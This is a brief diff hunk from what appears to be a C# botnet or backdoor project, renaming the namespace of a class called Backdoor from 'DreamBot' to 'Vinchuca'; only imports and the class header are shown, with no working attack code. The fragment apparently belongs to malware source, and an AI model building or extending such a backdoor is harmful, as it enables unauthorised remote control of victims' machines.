@@ -5,7 +5,7 @@ using System.Net;
 using System.Threading;
 using TcpClient = System.Net.Sockets.TcpClient;
 
-namespace DreamBot.Actions.Backdoor
+namespace Vinchuca.Actions.Backdoor
 {
     class Backdoor
     {
